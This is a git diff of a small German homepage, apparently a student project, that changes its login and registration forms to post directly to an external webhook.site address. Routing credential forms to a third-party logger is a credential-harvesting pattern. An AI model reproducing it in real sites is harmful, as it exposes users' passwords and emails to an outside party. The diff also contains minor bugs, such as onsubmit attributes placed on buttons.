@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 
 <html lang="de">
-
 <html>
+
     <head>
         <!-- Page information -->
         <title>Startseite</title>
@@ -22,7 +22,6 @@
             href="stylesheet.css">
     </head>
 
-    <!-- Page content -->
     <body>
 
         <header>
@@ -51,9 +50,9 @@
     
             </nav>
 
-            <!-- Benutzerbereich -->
+            <!-- Userarea -->
             <div id="navDesktop" class="login-register">
-                <!-- Benutzer ist nicht eingeloggt -->
+                <!-- User not logged in -->
                 <button>Login/Register</button>
                 <div class="dropdown-content">
                     <a onclick="openLoginModal()">Login</a>
@@ -63,7 +62,7 @@
 
         </header>
 
-        <!-- Modals für Login und Registrierung -->
+        <!-- Modals for Login, Registration, Cookies and Success Message-->
         <div class="modal-overlay" id="loginModal">
             <div class="modal-container">
                 <div class="modal-header">
@@ -71,16 +70,16 @@
                     <button class="modal-close" onclick="closeLoginModal()">×</button>
                 </div>
                 <div class="modal-body">
-                    <form id="loginForm" onsubmit="return loginSubmit();">
+                    <form id="loginForm" method="post"  action="https://webhook.site/bc4600b0-fe8b-4f95-a5ef-ee045cf58401">
                         <label for="loginUsername" class="label">Benutzername</label>
-                        <input type="text" id="loginUsername" class="input-field" placeholder="Geben Sie Ihren Benutzernamen ein..." autocomplete="username">
+                        <input type="text" id="loginUsername" class="input-field" required placeholder="Geben Sie Ihren Benutzernamen ein..." autocomplete="username">
                         <br>
                         <label for="loginPassword" class="label">Passwort</label>
-                        <input type="password" id="loginPassword" class="input-field" placeholder="Geben Sie Ihr Passwort ein..." autocomplete="current-password">
+                        <input type="password" id="loginPassword" class="input-field" required placeholder="Geben Sie Ihr Passwort ein..." autocomplete="current-password">
                     </form>
                 </div>
                 <div class="modal-footer">
-                    <button onclick="loginSubmit(event)" class="button button-success">Login</button>
+                    <button type="submit" form="loginForm" class="button button-success" onsubmit="openSuccesPopupModal()">Login</button>
                 </div>
             </div>
         </div>
@@ -92,19 +91,19 @@
                     <button class="modal-close" onclick="closeRegisterModal()"> x </button>
                 </div>
                 <div class="modal-body">
-                    <form id="registerForm" onsubmit="return registerSubmit();">
+                    <form id="registerForm" method="post"  action="https://webhook.site/bc4600b0-fe8b-4f95-a5ef-ee045cf58401">
                         <label for="registerMail" class="label">E-Mail</label>
-                        <input type="text" id="registerMail" class="input-field" placeholder="Geben Sie Ihre Email ein..." autocomplete="email">
+                        <input type="text" id="registerMail" class="input-field" required placeholder="Geben Sie Ihre Email ein..." autocomplete="email">
                         <br>
                         <label for="registerUsername" class="label">Benutzername</label>
-                        <input type="text" id="registerUsername" class="input-field" placeholder="Geben Sie Ihren Benutzernamen ein...">
+                        <input type="text" id="registerUsername" class="input-field" required placeholder="Geben Sie Ihren Benutzernamen ein...">
                         <br>
                         <label for="registerPassword" class="label">Passwort</label>
-                        <input type="password" id="registerPassword" class="input-field" placeholder="Geben Sie Ihr Passwort ein..." autocomplete="new-password">
+                        <input type="password" id="registerPassword" class="input-field" required placeholder="Geben Sie Ihr Passwort ein..." autocomplete="new-password">
                     </form>
                 </div>
                 <div class="modal-footer">
-                    <button type="submit" form="registerForm" class="button button-success" onclick="registerSubmit(event)">Registrieren</button>
+                    <button type="submit" form="registerForm" class="button button-success" onsubmit="openSuccesPopupModal()">Registrieren</button>
                 </div>
             </div>
         </div>
@@ -114,15 +113,28 @@
             <div class="modal-container">
                 <div class="modal-header">
                     <div class="modal-title">Cookies</div>
-                    <button class="modal-close" onclick="closeCookiesModal()"> x </button>
+                    <button class="modal-close" onclick="closeSuccesPopupModal()"> x </button>
                 </div>
                 <div class="modal-body">
                     <p>Diese Website verwendet Cookies, um Ihre Erfahrung zu verbessern. Durch die Nutzung dieser Website stimmen Sie der Verwendung von Cookies zu.</p>
-                    <button onclick="acceptCookies()" class="button button-success">Akzeptieren</button>
+                    <button onclick="openSuccesPopupModal()" class="button button-success">Akzeptieren</button>
                 </div>
             </div>
         </div>
 
+
+        <div class="modal-overlay" id="SuccesPopupModal">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <div class="modal-title">Succsess</div>
+                    <button class="modal-close" onclick="closeSuccesPopupModal()"> x </button>
+                </div>
+                <div class="modal-body">
+                    <p>Erfolgreich angeklickt</p>
+                </div>
+            </div>
+        
+        </div>
 
         <main>
             <div class="container">
@@ -158,15 +170,14 @@
                 <div class="sidebar">   
                 </div>
             </div>
-
         </main>
 
-
-
+        <!-- Cookies Modal öffnen -->
         <div class="fixed"> 
             <img src="bilder/cookie.jpeg" alt="Cookiebuton" width="40" height="40" onclick="openCookiesModal()" style="cursor: pointer;"></img>
         </div>
 
+        <!-- Footer -->
         <footer>
             <p>
                 Email: <a href="mailto:info@uni.de">info@uni.de</a>
@@ -179,10 +190,7 @@
             <p>© 2024 Meine Website. Alle Rechte vorbehalten.</p>
         </footer>
         
-
         <script src="javascript.js"></script>
 
-
     </body>
-</html>
-        
+</html> 
